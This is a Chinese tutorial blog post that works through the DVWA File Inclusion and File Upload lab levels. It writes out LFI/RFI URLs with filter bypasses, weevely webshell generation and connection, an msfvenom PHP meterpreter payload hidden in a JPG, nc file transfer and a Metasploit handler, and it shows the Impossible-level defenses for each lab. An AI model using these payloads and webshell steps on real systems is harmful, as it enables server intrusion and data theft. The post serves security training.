上篇介绍Command Injection和CSRF，该篇继续File Inclusion和File Upload。

## File Inclusion

文件包含漏洞，是指当服务器开启allow_url_include选项时，就可以通过php的某些特征性函数（incllude()、require()、include_once()、require_once()），利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致可以包含任意的文件或者任意命令执行。文件包含漏洞分为本地文件包含和远程文件包含，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。可以在php.ini中设置是否开启。

### 6.1 Low等级

6.1.1 漏洞分析

设置为Low等级，源码如下。服务器对page没有做任何过滤跟限制。服务器的期望是希望用户点击下面三个php文件，如果确认为php都会去尝试当做php文件区执行，如果文件内容确为php，则会正常执行并返回结果。如果不是，则会打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。

![image.png](https://image.3001.net/images/20200225/1582624598_5e54ef56efd2e.png!small)  

6.1.2 构造包含文件路径的url

拦截点击file1.php的请求，利用Burp截取如下

![image.png](https://image.3001.net/images/20200225/1582624613_5e54ef654e0fc.png!small)

构造url访问其他文件，这里假设其为linux系统，直接将page参数修改为文件路径，url如下<http://172.10.172.3/dvwa/vulnerabilities/fi/?page=/etc/shadow>，发送该请求，结果如下。这里说没有该文件，而且爆出绝对路径，是Windows系统。

![image.png](https://image.3001.net/images/20200225/1582624621_5e54ef6dc2df3.png!small)

所以可以根据绝对路径构造查看php.ini的url，page后面直接跟路径即可，url如下

[http://172.10.172.3/dvwa/vulnerabilities/fi/?page=D:\xampp\htdocs\dvwa\php.ini](http://172.10.172.3/dvwa/vulnerabilities/fi/?page=D:%5Cxampp%5Chtdocs%5Cdvwa%5Cphp.ini)

发送请求，读取php.ini文件，结果如下

![image.png](https://image.3001.net/images/20200225/1582624634_5e54ef7ace0fe.png!small)

这里补充下文件路径和网络路径中斜杠和反斜杠的使用，网络路径必须使用斜杠，文件路径斜杠和反斜杠效果一致。

当然此处在不知道绝对路径的时候，也可以构造相对路径来实现查看php.ini文件的目的，构造url如下

[http://172.10.172.3/dvwa/vulnerabilities/fi/?page=..\\..\\..\\..\\..\\..\xampp\htdocs\dvwa\php.ini](http://172.10.172.3/dvwa/vulnerabilities/fi/?page=..%5C..%5C..%5C..%5C..%5C..%5Cxampp%5Chtdocs%5Cdvwa%5Cphp.ini)

发送该请求，同样可以得到php.ini，这里使用..\多次是确保可以到达根目录下，当然如果路径不是这样的话，可以根据相对路径慢慢尝试

![image.png](https://image.3001.net/images/20200225/1582624654_5e54ef8e94d26.png!small)

配置文件中magic_quotes_gpc=
Off，在php版本小于5.3.4时，我们可以在文件名中使用%00进行截断，即php.ini和php.ini%0012.php得到的效果相同，但是如果使用%00就可以绕过文件结尾必须是.php的规则，假如有该过滤规则，则使用php.ini%0012.php仍然能查看php.ini的内容。

如果开启了allow_url_fopen选项，服务器会允许包含远程服务器上的文件，如果对文件没有检验的话，就可以导致任意的远程文件执行，在另一台服务器172.10.172.2上上传一个phpinfo.txt的文件，内容如下

![image.png](https://image.3001.net/images/20200225/1582624727_5e54efd7257c6.png!small)

之后构造如下url

<http://172.10.172.3/dvwa/vulnerabilities/fi/?page=http://172.10.172.2:8080/phpinfo.txt>

成功执行了函数，结果如下，证明远程文件包含漏洞存在。

![image.png](https://image.3001.net/images/20200225/1582624734_5e54efdec72bf.png!small)

### 6.2 Medium等级

6.2.1 漏洞分析

设置为Medium等级后，源码改动如下，发现只是利用str_replace将"http://"、"https://"、"..\""、"../"过滤为空字符。

![image.png](https://image.3001.net/images/20200225/1582624795_5e54f01b596e3.png!small)

6.2.2 利用重复过滤字符进行绕过

这个技巧很常见，当过滤是单个字符的时候没法使用，但是过滤字符串的时候可以将过滤字符串放入过滤字符串中间来进行绕过，比如htthttp://p://、…/./来实现绕过，当然绝对路径D:\xampp\htdocs\dvwa\php.ini并不会受到影响。

本地文件包含（使用相对路径），这里发现他是将..\"过滤，所以相对路径也可以按low等级复现。

所以这里只复现远程文件包含将url改为如下链接

<http://172.10.172.3/dvwa/vulnerabilities/fi/?page=hthttp://tp://172.10.172.2:8080/phpinfo.txt>

请求结果，可以成功显示phpinfo信息，结果如下图所示，说明可以绕过，文件包含漏洞存在。

![image.png](https://image.3001.net/images/20200225/1582624923_5e54f09bea1fa.png!small)

  

6.3 High等级

6.3.1 漏洞分析

设置为High等级，源码对输入的page内容进行了限制，必须是file开头的值，所以必须以file开头才可以执行，增加了一定的安全性。

![image.png](https://image.3001.net/images/20200225/1582624936_5e54f0a8171f5.png!small)  

6.3.2 利用file协议绕过

这里虽然只能以file开头，但是用浏览器访问本地文件我们可以发现其是以file:///文件绝对路径的形式进行访问，如下图访问本地某文件可以看出

![image.png](https://image.3001.net/images/20200225/1582624914_5e54f0924a65a.png!small)

所以这里我们可以构造page内容为file:///D:\xampp\htdocs\dvwa\php.ini，这里的绝对路径由爆破得出，所以构造如下url

[http://172.10.172.3/dvwa/vulnerabilities/fi/?page=file:///D:\xampp\htdocs\dvwa\php.ini](http://172.10.172.3/dvwa/vulnerabilities/fi/?page=file:///D:%5Cxampp%5Chtdocs%5Cdvwa%5Cphp.ini)

请求该链接，可以发现执行成功，漏洞仍然存在

![image.png](https://image.3001.net/images/20200225/1582624999_5e54f0e7be80f.png!small)

同样可以构造相对路径url如下

[http://172.10.172.3/dvwa/vulnerabilities/fi/?page=file:///..\\..\\..\xampp\htdocs\dvwa\php.ini](http://172.10.172.3/dvwa/vulnerabilities/fi/?page=file:///..%5C..%5C..%5Cxampp%5Chtdocs%5Cdvwa%5Cphp.ini)

请求该链接，同样可以执行，说明漏洞存在

![image.png](https://image.3001.net/images/20200225/1582625042_5e54f1122ba57.png!small)

当然如果想执行自己写的php脚本，就需要利用文件上传漏洞将文件上传，然后根据其路径来进行执行想要的php代码。

### 6.4 Impossible等级

设置为Impossible等级，源码如下，该源码使用了白名单机制，简单粗暴，只有file1.php、file2.php、file3.php三个文件可以进行包含，彻底杜绝了文件包含漏洞。这里说明黑名单的设置总是会因为一些漏洞或者考虑不全面而进行绕过，但是白名单比较简单直接，可以完全限制绕过。只有符合的才会被执行。

![image.png](https://image.3001.net/images/20200225/1582625082_5e54f13af0c7e.png!small)  

## File Upload

文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，具有很大的危害，前面我们所说的CSRF、File
Injection有时候都需要借助文件上传来进行复现，所以较为重要。

### 7.1 Low等级

7.1.1 漏洞分析

设置为Low等级，源码如下，这里basename(path,
suffix)返回path中的文件名，suffix可选，为空则返回带后缀的文件，利用该函数获得目标路径，然后直接将文件上传到该路径。文件没有经过类型和内容进行任何过滤检测，存在明显的文件上传漏洞。

![image.png](https://image.3001.net/images/20200225/1582625097_5e54f1496a5ed.png!small)

7.1.2 利用Kali下weevely生成后门文件

在Windows下我们可以使用中国菜刀来获取Webshell，webshell就是匿名用户通过网站端口对网站服务器的某种程度上的操作权限。但是环境问题中国菜刀不能使用，所以使用kali下的weevely来进行代替。当然kali下的webacoo也可以实现该功能，weevely只支持php，且只可以在命令行终端执行。

执行如下指令生成一个webshell，password可以替换为其他密码，只有知道密码才可以连接后门，命令如下，执行结果如图所示，默认的hack.php路径生成在/usr/share/weevely/hack.php

weevely generatepassword hack.php

![image.png](https://image.3001.net/images/20200225/1582625111_5e54f157cd6e1.png!small)

之后将生成的hack.php进行上传，结果表示上传成功，截图如下

![image.png](https://image.3001.net/images/20200225/1582625122_5e54f16254d63.png!small)

根据上传的结果显示以及url可以得到hack.php的url路径，然后使用weevely进行连接，命令如下

weevelyhttp://172.10.172.3/dvwa/hackable/uploads/hack.php password

然后就获得了连接，建立session，简单的dir操作如下

![image.png](https://image.3001.net/images/20200225/1582625131_5e54f16b78440.png!small)

这里可以使用help来查看可以进行的操作，我们发现这里有很多功能，比如枚举用户密码、爆破数据库密码、上传本地文件、读文件、删除文件，启动SQL控制台、脱库、端口扫描、收集系统信息、编写php文件等功能，危害极大，具体操作截图如下

![image.png](https://image.3001.net/images/20200225/1582625148_5e54f17c25fc3.png!small)

### 7.2 Medium等级

7.2.1 漏洞分析

设置为Medium等级，源码改变如下，对上传文件的类型和大小做了限制，要求图片格式是jpeg或者png，大小不超过1000B（97.6KB）。

![image.png](https://image.3001.net/images/20200225/1582625163_5e54f18bac775.png!small)

7.2.2 （不可行思路）利用weevely和文件包含漏洞结合

同Low等级相同，这里用如下命令生成密码为password的后门文件hack.png，命令操作为weevely generate password
hack.png。生成的结果如图所示

![image.png](https://image.3001.net/images/20200225/1582625171_5e54f193a0369.png!small)

生成的后门文件类型和大小都满足要求，这里上传，查看是否成功，结果如下，可以确认该文件同样可以上传。

![image.png](https://image.3001.net/images/20200225/1582625178_5e54f19a376a9.png!small)

然后执行命令来进行连接，获取Webshell，这里操作和Low等级一致，命令如下

weevelyhttp://172.10.172.3/dvwa/hackable/uploads/hack.png password

![image.png](https://image.3001.net/images/20200225/1582625186_5e54f1a24bd3e.png!small)

但是这里结果和想象的并不一样，原因是向服务器上传的hack.png本身为一个php文件，利用weevely连接时候，php文件执行成功，则可以获取webshell，但是这里将它的类型改为png，服务器就会按图片进行解析，无法执行php命令

这里需要可以直接执行文件内容的链接，因为文件包含漏洞中，会直接输出文件内容，所以可以让weevely请求文件包含漏洞的url，这里已经知道文件上传地址，则url如下

[http://172.10.172.3/dvwa/vulnerabilities/fi/?page=hthttp://tp://172.10.172.3/dvwa/hackable/uploads/hack.png](http://172.10.172.3/dvwa/vulnerabilities/fi/?page=hthttp://tp://172.10.172.3/dvwa/hackable/uploads/hack.png%20)

执行如下命令，结果如下

![image.png](https://image.3001.net/images/20200225/1582625205_5e54f1b5a1233.png!small)

发现仍然不能执行，所以该方法只作为一个思路执行，因为中国菜刀使用该方法可行。

7.2.3 使用Burp拦截修改文件后缀

使用Burp拦截生成的hack.png文件，结果如下

![image.png](https://image.3001.net/images/20200225/1582625238_5e54f1d635cf7.png!small)

这里我们将hack.png转换成hack_change.php，修改如下

![image.png](https://image.3001.net/images/20200225/1582625246_5e54f1de4e84c.png!small)

然后点击forward，然后执行结果如下，上传成功

![image.png](https://image.3001.net/images/20200225/1582625252_5e54f1e4ceec6.png!small)

再次使用weevely连接，命令和结果如下，webshell获取成功，说明漏洞存在。

![image.png](https://image.3001.net/images/20200225/1582625261_5e54f1ed5e444.png!small)

7.2.4 利用Burp修改文件类型字段

这里上传weevely生成的hack.php文件，然后利用Burp拦截，发现其Content-Tyep为application/x-php，如图所示

![image.png](https://image.3001.net/images/20200225/1582625273_5e54f1f96dc09.png!small)

这里将Content-Type改为image/png，让程序认为上传的文件时png格式，修改截图和点击Forward后结果如下

![image.png](https://image.3001.net/images/20200225/1582625298_5e54f21286946.png!small)

![image.png](https://image.3001.net/images/20200225/1582625308_5e54f21cc0e8a.png!small)

这样执行weevely命令同样可以获得webshell，结果如下

![image.png](https://image.3001.net/images/20200225/1582625332_5e54f2346f7cc.png!small)  

### 7.3 Hige等级

7.3.1 漏洞利用

设置为High等级，源码修改如下，这里可以发现对类型和文件后缀都进行了判断，必须是图片类型，这里的getimagesize是读取文件的头信息，要求必须是图片类型才可以读取。

![image.png](https://image.3001.net/images/20200225/1582625339_5e54f23b4b7a3.png!small)

7.3.2 利用metasploit创造后门

首先我们尝试利用weevely生成后门，并用copy命令将生成的后门嵌入到图片中并上传，然后利用文件包含漏洞尝试连接，发现失败。所以此处我们利用metasploit来进行后门生成，首先执行如下命令生成向目标172.10.172.3的4444端口建立连接的后门msf.php

msfvenom –p php/meterpreter/bind_tcp lhost=172.10.172.3 lport=4444
–o/usr/share/weevely/msf.php

![image.png](https://image.3001.net/images/20200225/1582625350_5e54f2464d3f3.png!small)

这里要想将生成的msf.php移到windows下，可以是使用nc来进行，kali执行如下命令

nc –lp 333 < msf.php

windows执行如下命令

nc –nv 172.10.172.4 333> msf.php

之找一个图像文件，使用如下命令将msf.php嵌入到图像中

copy hack.jpg/b+msf.php hack_he.jpg

合成结果如下

![image.png](https://image.3001.net/images/20200225/1582625399_5e54f277ac4d1.png!small)

之后上传合成的图像到服务器，发现嵌有php后门的图片可以成功上传结果如下。

![image.png](https://image.3001.net/images/20200225/1582625405_5e54f27d8ba49.png!small)

再kali中进入msfconsole攻击，然后选择使用exploit/multi/handlre模块，如图

![image.png](https://image.3001.net/images/20200225/1582625412_5e54f284c6fcd.png!small)

这里我们要设置之前后门所使用的payload，使用如下命令

set payload php/meterpreter/bind_tcp

通过查看设置，配置后门所使用rhost和lpost

![image.png](https://image.3001.net/images/20200225/1582625424_5e54f29002b87.png!small)

这样输入run后，我们访问可以执行刚才上传文件的页面即可，由于文件上传漏洞已经限制了图片类型，所以我们直接访问上传地址，返回的是图像，无法读取嵌入的内容，这里使用文件包含来执行该命令，地址为

[http://172.10.172.3/dvwa/vulnerabilities/fi/?page=file:///D:\xampp\htdocs\dvwa\hackable\uploads\hack_he.jpg](http://172.10.172.3/dvwa/vulnerabilities/fi/?page=file:///D:%5Cxampp%5Chtdocs%5Cdvwa%5Chackable%5Cuploads%5Chack_he.jpg)

这里的执行顺序是，先在msf中输入run命令，而后请求上述的url链接，得到的结果如下

![image.png](https://image.3001.net/images/20200225/1582625489_5e54f2d10d5a8.png!small)

同weevely一样，这里获得了webshell，而且可以使用help来执行各种命令，这里需要强调的是，只能通过文件包含漏洞来复现，如果直接按图片的绝对路径访问会返回图片，无法获取后门。至于用msfconsole连接后，怎么去持久性获取后门以及怎么利用，这里就不再去做。

### 7.4 Impossible等级

设置为Impossible等级，源码改动如下，加入了CSRF-Anti
token，对文件进行了md5操作，判断后缀大小和类型，读取图像头，而且对图像进行重新严格检查，重新编码图像，导致攻击者无法上传含有恶意脚本的文件。

![image.png](https://image.3001.net/images/20200225/1582625545_5e54f309c6230.png!small)

##  

更多内容请持续关注本专栏，谢谢~

